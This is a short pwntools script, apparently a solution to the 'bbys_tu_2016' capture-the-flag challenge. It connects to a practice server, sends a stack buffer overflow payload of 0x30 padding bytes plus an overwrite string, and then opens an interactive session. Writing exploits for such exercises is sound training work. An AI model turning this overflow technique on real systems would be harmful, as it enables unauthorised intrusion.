from pwn import *
from LibcSearcher import *

import utils

context.arch = 'amd64'
context.log_level = 'debug'

target = remote('node4.buuoj.cn', 28065)

elf = ELF('../bbys_tu_2016')

fake_flag = 'n0t_r3@11y_f1@g'
payload = b'a' * 0x30 + fake_flag.encode()
target.sendline(payload)
target.interactive()
